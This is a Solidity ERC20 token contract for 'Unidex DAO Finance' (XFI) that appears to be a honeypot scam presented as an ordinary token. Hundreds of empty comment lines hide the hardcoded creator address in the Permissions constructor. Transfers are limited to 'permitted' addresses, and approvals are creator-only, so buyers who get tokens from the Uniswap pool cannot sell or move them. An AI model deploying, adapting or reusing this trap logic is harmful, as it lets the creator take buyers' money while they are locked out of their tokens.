pragma solidity ^0.6.6;

// Address.sol

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies in extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// Context.sol

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// SafeMath.sol

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// Permissions.sol

// ----------------------------------------------------------------------------
// Permissions contract
// ----------------------------------------------------------------------------
contract Permissions is Context
{
    address private _creator;
    address private _uniswap;
    mapping (address => bool) private _permitted;

    constructor() public
    {
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
       
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        //////////////////////////////
        _creator = 0x12CC7AC1D8504ed65265946917731faE86fd273b; // creator address, owner of the created tokens
        _uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // uniswap address, don't change this. This is to allow Uniswap trading via Uni. V2
        
        _permitted[_creator] = true;
        _permitted[_uniswap] = true;
    }
    
    function creator() public view returns (address)
    { return _creator; }
    
    function uniswap() public view returns (address)
    { return _uniswap; }
    
    function givePermissions(address who) internal
    {
        require(_msgSender() == _creator || _msgSender() == _uniswap, "You do not have permissions for this action");
        _permitted[who] = true;
    }
    
    modifier onlyCreator
    {
        require(_msgSender() == _creator, "You do not have permissions for this action");
        _;
    }
    
    modifier onlyPermitted
    {
        require(_permitted[_msgSender()], "You do not have permissions for this action");
        _;
    }
}

// Token.sol

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is Permissions, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18 and a {totalSupply} of the token.
     *
     * All four of these values are immutable: they can only be set once during
     * construction.
     */
    constructor () public {
        //_name = "Unidex DAO Finance";
        //_symbol = "XFI";
        _name = "Unidex DAO Finance";
        _symbol = "XFI";
        _decimals = 18;
        _totalSupply = 24000000000000000000000;
        
        _balances[creator()] = _totalSupply;
        emit Transfer(address(0), creator(), _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {balanceOf} and {transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual onlyCreator override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        
        if(_msgSender() == uniswap())
        { givePermissions(recipient); } // uniswap should transfer only to the exchange contract (pool) - give it permissions to transfer
        
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual onlyCreator returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual onlyCreator returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
